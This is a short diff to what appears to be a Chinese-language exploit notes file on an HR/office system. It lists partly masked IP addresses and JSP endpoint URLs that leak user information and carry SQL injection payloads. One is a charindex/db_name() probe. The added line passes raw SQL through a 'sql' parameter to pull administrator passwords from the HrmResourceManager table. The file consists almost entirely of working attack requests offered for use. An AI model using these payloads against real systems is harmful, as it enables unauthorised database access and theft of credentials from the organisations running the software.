@@ -29,3 +29,5 @@ userid信息泄露+SQL注入
 http://220.xx.122.x:288/contract/base/getHrmInfo.jsp?userid=4
 /mobile/plugin/contract/base/getHrmInfo.jsp?userid=4-charindex('§x§',db_name())
 
+http://222.xx.xxx.2:8081/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
+
